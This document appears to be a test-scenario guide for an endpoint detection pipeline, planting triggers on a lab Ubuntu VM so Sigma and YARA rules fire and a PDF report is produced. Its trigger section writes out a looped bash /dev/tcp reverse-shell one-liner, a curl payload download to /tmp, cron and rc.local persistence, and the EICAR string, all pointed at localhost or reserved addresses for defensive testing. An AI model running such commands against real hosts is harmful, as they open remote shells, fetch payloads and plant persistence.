# YARA & Sigma Rules Detection — Test Scenario (Ubuntu VM)

End-to-end scenario that triggers **Sigma behavioral rules** (backend-side matching)
and **YARA rules** (agent-side `file_scan`), then produces a PDF investigation report.

Reference deployment for this document:

| Component | Where | Address |
|---|---|---|
| Backend (Docker) | Windows host | `192.168.50.1:8000` |
| Ubuntu VM (collector) | `ns-ubuntu-server` | `192.168.50.129` |

---

## How the demo works

- The collector gathers artifacts (processes, network, persistence, scheduled_tasks,
  logs, file_scan) and pushes them to `POST /ingest`.
- The backend's `run_detection_job()` matches **Sigma rules** against the pushed
  process/network/persistence/scheduled_task artifacts.
- **YARA** is scanned on the endpoint by `file_scan` (`collector/modules/file_scan.py`)
  using a rules folder passed via `--yara-rules`; matches are embedded in the pushed
  artifact and become detections on the backend.
- Findings land in `/detections` and are rendered into a PDF by `/reports/run-now`.

---

## 1. Pre-flight (one-time setup on the VM)

```bash
cd ~/collector
venv/bin/pip install -r requirements.txt            # installs psutil + requests
venv/bin/pip install yara-python                     # enables agent-side YARA
```

Ship the rules from the Windows host to the VM.
**Ship only `curated_ruleset.yar`** — `test_eicar.yar` defines a duplicate
`EICAR_Test_String` rule that would double-report:

```bash
# from the Windows host (repo root):
scp backend/yara_rules/curated_ruleset.yar youssef@192.168.50.129:~/collector/yara_rules/
```

Verify connectivity both ways:

```bash
# from the VM — must print {"status":"ok"}:
curl -s http://192.168.50.1:8000/health
```

---

## 2. Plant the triggers (Terminal A on the VM)

Run with `sudo`/root for persistence visibility (crontabs + `/etc/rc.local`).

```bash
# 1) Account discovery  -> rule-008 (whoami)
(while true; do whoami; sleep 300; done) &

# 2) Network configuration discovery -> rule-009 (ip a)
(while true; do ip a; sleep 300; done) &

# 3) Ingress tool transfer -> rule-011 (curl -o to disk)
(while true; do curl -o /tmp/demo_payload http://192.0.2.1/x --max-time 1; sleep 300; done) &

# 4) Reverse-shell one-liner -> rule-015 (critical).
#    Loops against 127.0.0.1 so nothing harmful actually happens.
bash -c 'while true; do bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 2>/dev/null; sleep 3; done' &

# 5) EICAR test file as a live process -> YARA EICAR_Test_String.
#    Copy /bin/sleep and append the EICAR string so the running process's exe path
#    (/tmp/eicar_demo) gets hashed + YARA-scanned by file_scan.
cp /bin/sleep /tmp/eicar_demo
printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' >> /tmp/eicar_demo
chmod +x /tmp/eicar_demo
/tmp/eicar_demo 900 &

# 6) Live connection to "C2" port 4444 -> rule-010 (needs a listener + a client)
python3 -m http.server 4444 --bind 127.0.0.1 &
bash -c 'exec 3<>/dev/tcp/127.0.0.1/4444; sleep 900' &

# 7) Persistence: cron entry referencing /tmp -> rule-002 ; rc.local -> rule-013
(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/eicar_demo.sh') | crontab -
printf '#!/bin/sh\nexit 0\n' > /etc/rc.local && chmod +x /etc/rc.local
```

---

## 3. Run the collector (Terminal A — keep the triggers alive)

```bash
cd ~/collector
sudo venv/bin/python3 collector_agent.py \
  --yara-rules ~/collector/yara_rules \
  --push-url http://192.168.50.1:8000
```

- `sudo` is recommended so persistence (crontabs, `/etc/rc.local`) is collected.
  Without it, rules 002/013 won't appear but the rest still fire.
- Each artifact type is pushed as its own `/ingest` batch; push failures print
  `[!] Push failed ...` and do not stop the run.

---

## 4. Backend: detect + generate + download the report

```bash
# Run detection deterministically (the scheduler also runs it every interval):
curl -X POST http://192.168.50.1:8000/detect

# Inspect the findings for this host:
curl -s "http://192.168.50.1:8000/detections?host=ns-ubuntu-server&limit=50"

# Generate the investigation report (returns run_id + pdf_filename):
curl -s -X POST "http://192.168.50.1:8000/reports/run-now"

# Download the PDF (replace <RUN_ID> with the run_id from the previous response):
curl -s -o demo_report.pdf "http://192.168.50.1:8000/reports/<RUN_ID>/download"

# Or grab the report from the dashboard's history:
open http://192.168.50.1:8000/dashboard
```

---

## 5. Expected detections

| Rule | Source | Severity | Trigger |
|---|---|---|---|
| rule-015 | process | critical | `bash -i >& /dev/tcp/` loop |
| rule-010 | network | high | ESTABLISHED `127.0.0.1:4444` |
| rule-011 | process | high | `curl -o /tmp/demo_payload` |
| `yara-EICAR_Test_String` | file_scan | high | `/tmp/eicar_demo` contains EICAR |
| rule-002 | persistence | medium | cron entry referencing `/tmp/` |
| rule-008 | process | low | `whoami` |
| rule-009 | process | low | `ip a` |
| rule-013 | persistence | low | `/etc/rc.local` present |

The report's Severity Breakdown and ATT&CK Technique Coverage will reflect these
(e.g. T1059.004, T1571, T1105, T1053.003, T1082, T1016, T1037.004).

---

## 6. Cleanup (Terminal A)

```bash
kill %1 %2 %3 %4 %5 %6 %7 2>/dev/null
pkill -f eicar_demo; pkill -f http.server
rm -f /tmp/eicar_demo /tmp/demo_payload
crontab -r
```

---

## Notes / caveats (verified against the source)

- **YARA only fires via the manual `--yara-rules` run.** The orchestrator's
  per-endpoint `run-now` SSH command does not pass `--yara-rules`, so that path
  hashes files but does not YARA-scan them (documented gap in the audit). Detection
  and reporting work in both cases.
- The EICAR file here is `sleep` + EICAR, so it triggers the **YARA** rule but does
  **not** match the exact known-bad-hash entry (that requires the 68-byte EICAR file
  and a process pointing at it). The YARA rule alone validates the YARA pipeline.
- `rule-010` requires the connection to be ESTABLISHED while the collector runs.
- `rule-015` requires `bash` (default on Ubuntu).
- Host filter: detections store the collector's `socket.gethostname()` — keep
  `endpoint.name` == VM hostname (`ns-ubuntu-server`) so report scoping lines up.
- For full visibility (all processes/connections/logs owned by other users), run the
  collector as root — matching the audit's non-root caveats.
